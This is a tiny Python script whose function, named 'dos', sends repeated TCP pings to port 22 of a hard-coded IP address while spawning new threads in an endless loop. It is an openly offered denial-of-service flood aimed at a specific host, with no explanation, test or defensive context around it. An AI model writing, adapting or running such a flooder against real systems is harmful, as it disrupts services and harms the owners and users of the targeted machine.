import threading
import requests
from tcping import Ping

def dos():
 ping = Ping('161.129.181.3', 22, 1)
 ping.ping(2)

while True:
 threading.Thread(target=dos).start()
